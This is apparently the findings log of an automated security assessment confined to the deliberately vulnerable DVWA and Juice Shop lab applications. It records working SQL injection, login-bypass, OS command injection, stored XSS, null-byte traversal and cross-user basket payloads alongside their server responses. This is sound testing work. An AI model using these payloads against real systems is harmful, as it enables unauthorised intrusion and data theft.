state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

Mapping probe: GET /rest/basket/1 returned HTTP 200 with basket UserId 1 (Apple x2, Orange x3, Eggfruit x1) to BOTH acct1 (own id 6) and acct2 (own id 7), i.e. no ownership check observed. Flagged for Verification; not formally verified here.

findings.title: [security=low] SQL Injection (boolean-based) in DVWA /vulnerabilities/sqli/ id parameter
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned HTTP 200 with 5 'ID: 1' OR '1'='1 / First name / Surname' records. Surnames recorded: admin (first name admin), Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob). FALSE payload id=1' AND '1'='2 returned HTTP 200 with 'User ID:' form and ZERO records. Difference confirms boolean SQL injection in the quoted id parameter. SQLi DB: mysql.

findings.title: [security=low] OS Command Injection in DVWA /vulnerabilities/exec/ ip parameter
request_sequence: POST http://dvwa/vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin, security=low)
findings.response_evidence: [security=low] HTTP 200. Ping output for 127.0.0.1 (4 packets transmitted, 4 received) followed immediately by the injected command output line 'www-data' before 'More Information'. Web-process identity www-data confirmed via command injection.

findings.title: [security=low] Stored XSS in DVWA guestbook /vulnerabilities/xss_s/ mtxMessage
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form txtName=tester&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook (session dvwa_admin, security=low)
findings.response_evidence: [security=low] POST accepted and stored; the guestbook entry 'Name: tester Message:' rendered with the script element hidden from text view (stored as markup). Note: the full 53-char canary was sent in the POST body, exceeding the client-side maxlength=50 on the textarea; the server did not truncate it at security=low, so the canary was stored intact. Browser load of /vulnerabilities/xss_s/ as dvwa_admin, then window.xss_flag evaluated to 1.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/:id
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1) -> control: own basket, UserId 22
GET http://juiceshop:3000/rest/basket/7 (session juiceshop_acct2) -> control: own basket, UserId 23
findings.response_evidence: acct1 (own_basket_id=6) GET /rest/basket/6 -> 200 {"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"quantity":3}}]}. acct2 (own_basket_id=7) GET /rest/basket/6 -> 200 identical body: "UserId":22, "name":"Apple Juice (1000ml)", "quantity":3 — Account 1's basket returned to Account 2. Control: acct2 GET /rest/basket/7 -> 200 "UserId":23, "Orange Juice (1000ml)", quantity 1 (its own basket). No ownership check is enforced on the basket ID.

findings.title: Login authentication bypass SQL injection via email field on POST /rest/user/login
findings.response_evidence: HTTP 200 with body {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid JWT was issued for the first user (admin@juice-sh.op, bid 1) without knowing the password, while the baseline wrong-password probe returns 401 "Invalid email or password." This confirms the email parameter is injected into the authentication SQL query.

findings.title: Product-search SQL injection on /rest/products/search?q= (unauthenticated)
request_sequence: GET /rest/products/search?q=apple  -> 200 JSON, 2 products (Apple Juice, Apple Pomace), no error
GET /rest/products/search?q=qwert'  -> 500 text/html 'Error: SQLITE_ERROR: near "'%'": syntax error'
findings.response_evidence: Benign q=apple returned 200 with valid product data and no error. Single-quote q=qwert' returned HTTP 500 with 'SQLITE_ERROR: near \"'%'\": syntax error'. The 9-column UNION payload returned HTTP 200 with the injected integers 2..9 reflected in the product fields (name:2, description:3, price:4 ...), proving attacker-controlled UNION SELECT into the query result. Confirmed SQL injection, unauthenticated.

findings.title: Unauthenticated access to user feedback on /api/Feedbacks with only partially masked author emails
request_sequence: GET /api/Feedbacks (unauth, no credentials) -> 200 JSON with 8 records
findings.response_evidence: Records are returned without authentication (200, 8 feedback entries with UserId, id, comment, rating, createdAt, updatedAt). However, author emails are NOT fully disclosed: they appear server-side masked inside comment text, e.g. 'I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)', 'Great shop! Awesome service! (***@juice-sh.op)', 'Nothing useful available here! (***der@juice-sh.op)', '(***ereum@juice-sh.op)'. Anonymous entries show '(anonymous)'. No full author email address and no email field is returned, so the stated criterion (disclosure of author email addresses) is not met. Unauthenticated access to feedback is noted as an access-control observation, but the PII claim is rejected as stated.

findings.title: Confidential acquisitions memo exposed via open /ftp/ directory listing
request_sequence: GET /ftp/ with Accept: text/html,application/json -> 200 text/html listing including 'acquisitions.md 909'
findings.response_evidence: Directory listing at /ftp/ (200, unauthenticated) lists acquisitions.md (909 bytes). Direct GET /ftp/acquisitions.md returns 200 text/markdown with the memo: '# Planned Acquisitions' / '> This document is confidential! Do not distribute!' / 'Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph:' ... 'Our shareholders will be excited. It's true. No fake news.'

findings.title: Poison null-byte path traversal bypasses /ftp/ extension filter to retrieve restricted package.json.bak
findings.response_evidence: Raw path: HTTP 403, body "Error: Only .md and .pdf files are allowed!" (fileServer.js). Null-byte path: HTTP 200, content-type application/octet-stream, body begins with '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}' i.e. the restricted package.json.bak contents.

findings.title: Exposed browsable encryption-keys directory /encryptionkeys/ lists premium.key and jwt.pub
findings.response_evidence: HTTP 200, content-type text/html; directory listing rendered: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". Links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key present.

findings.title: Cross-user basket read: juiceshop_acct2 retrieves basket 1 owned by UserId 1 (another user)
findings.response_evidence: HTTP 200 {"status":"success","data":{"id":1,"coupon":null,"UserId":1,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"quantity":2}},{"id":2,"name":"Orange Juice (1000ml)","BasketItem":{"quantity":3}},{"id":3,"name":"Eggfruit Juice (500ml)","BasketItem":{"quantity":1}}]}}. Basket owner context: UserId 1, which is not acct2's basket (acct2 own_basket_id=7, acct2 UserId != 1). Distinct seeded items returned: Apple Juice x2, Orange Juice x3, Eggfruit Juice x1. Note: the mapping probe also returned this same basket to acct1 (own basket 6), so the ownership check is absent for basket 1.

findings.title: DVWA security-level control endpoint functional (not a vulnerability claim)
findings.response_evidence: Level change endpoint is functional. After the POST, the GET returned: 'Security level is currently: medium.' and 'Security level set to medium' / 'Security Level: medium'. Note: the 302 response followed a token that rotated (new user_token feb7baf9d5271749b8f7e135c352652d issued on the follow-up page). This is a control endpoint, not a vulnerability instance; no CWE is claimed. Coordinator may decide whether to treat as a non-finding.

findings.title: [security=medium] SQL Injection in POST id parameter (numeric boolean)
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' returned 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id='1 AND 1=2' returned zero records (only the 'User ID: 1 2 3 4 5' prompt, no 'First name'/'Surname' rows). Injection is confirmed by the boolean differential.

findings.title: [security=medium] OS Command Injection in ip parameter via pipe bypass
findings.response_evidence: [security=medium] Payload ip='127.0.0.1| whoami' (semicolon/&& not used) returned the page output 'Enter an IP address: www-data' with HTTP 200. The 'www-data' string is the web-process identity, confirming command execution through the pipe metacharacter that bypasses the medium blacklist.

findings.title: Cross-user basket read: juiceshop_acct1 retrieves basket 7 owned by UserId 23 (acct2)
request_sequence: GET http://juiceshop:3000/rest/basket/7 (session juiceshop_acct1; session_info own_basket_id=6, email acct1_bench@juiceshop.local)
findings.response_evidence: HTTP 200 application/json: {"status":"success","data":{"id":7,"coupon":null,"UserId":23,...,"Products":[{"id":2,"name":"Orange Juice (1000ml)",...,"BasketItem":{"ProductId":2,"BasketId":7,"id":10,"quantity":1}}]}}. Acct1 owns basket 6 only, so basket 7 (UserId 23) is another user's basket and was read cross-user. Distinct instance from the basket 1 and basket 6 findings: different basket ID and the item is Orange Juice (1000ml) qty 1. Note: the assignment listed acct2 as the owner of basket 7; the UserId 23 mapping is taken from the response and was not independently checked against acct2.

findings.title: Open directory listing of /ftp/ exposes internal files to unauthenticated users
request_sequence: GET http://juiceshop:3000/ftp/ with headers Accept: text/html,application/json (session unauth)
findings.response_evidence: HTTP 200 text/html, directory index "listing directory /ftp/". Listed entries: quarantine/, acquisitions.md (909), announcement_encrypted.md (369237), coupons_2013.md.bak (131), eastere.gg (324), encrypt.pyc (573), incident-support.kdbx (3246), legal.md (3047), package.json.bak (4291), suspicious_errors.yml (723). Listing is served without authentication. Backup, key-database, and memo files are exposed. Retrieval of acquisitions.md is covered by its own finding.

findings.title: Poison null-byte bypass of /ftp/ file-type filter exposes restricted package.json.bak
findings.response_evidence: Raw path: HTTP 403 "Error: Only .md and .pdf files are allowed!" (fileServer.js:55). Null-byte bypass: GET /ftp/package.json.bak%2500.md returns HTTP 200 application/octet-stream with the restricted file contents, starting with {"name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}. The 403-to-200 difference shows the extension filter is bypassed. Not verified: whether a prior record for this bypass already exists; the coordinator should dedupe against it if so.

findings.title: [security=high] SQL Injection via session-input.php -> /vulnerabilities/sqli/ (boolean TRUE returns seeded users, FALSE returns none)
request_sequence: POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] -> 302; GET security.php shows 'Security level is currently: high'
findings.response_evidence: [security=high] TRUE payload 1' OR '1'='1' # returned 5 records: ID: 1' OR '1'='1' # First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload 1' AND '1'='2' # returned zero records (only 'Click here to change your ID' and page chrome, no 'First name/Surname' rows). Security level shown on page as 'high'. Note: session_info metadata still reports security_level 'low' but the page body reports 'Security level is currently: high' and 'Security Level: high'. Browser-free, HTTP-only verification.

findings.title: [security=high] OS Command Injection via ip parameter using pipe without trailing space (127.0.0.1|whoami)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> security level set to high (see SQLi finding sequence)
findings.response_evidence: [security=high] POST /vulnerabilities/exec/ with ip=127.0.0.1|whoami returned HTTP 200; the 'Ping a device' output block contains the line 'www-data' immediately after the ping result header ('Enter an IP address: www-data'). Page footer reports 'Security Level: high'. The pipe-without-space payload bypassed the high-level blacklist of '; ', '| ' and '&&'.
